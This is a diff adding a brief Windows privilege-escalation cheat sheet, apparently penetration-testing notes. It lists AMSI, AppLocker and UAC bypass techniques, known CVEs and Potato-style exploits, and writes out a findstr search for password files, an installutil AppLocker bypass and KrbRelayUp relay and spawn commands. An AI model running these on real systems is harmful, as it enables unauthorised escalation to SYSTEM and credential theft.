@@ -1,0 +1,44 @@
+### Privesc
+
+Get Applocker info
+	Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe (dll/msi/...)
+
+winpeas.exe
+
+
+AMSI bypass
+	https://amsi.fail/
+	Reflection method
+	Patching amsi.dll
+
+search password files
+	findstr /si 'password' *.txt *.xml *.docx
+	User account
+
+AppLocker (whitelisting) bypass
+	use C:\Windows\Tasks
+	use C:\Windows\Temp
+	Powershell CLM bypass
+		installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe
+	mshta.exe my.hta
+	MSBuild
+
+User Access Control (UAC) bypass
+	FodHelper
+	WSReset
+	MSDT
+
+SMBGhost CVE-2020-0796
+
+CVE-2021-36934 (HiveNightmare/SeriousSAM)
+
+service account (IIS/Mssql) 
+(got SEImpersonate)
+	RoguePotato
+	Juicy Potato / Lovely Potato
+	🔥 PrintSpoofer
+
+🔥 KrbRelayUp
+	.\KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>
+		./KrbRelayUp.exe spawn -m rbcd -d <omdain> -dc <dc> -cn <computer_name>-cp <omputer_pass>
+
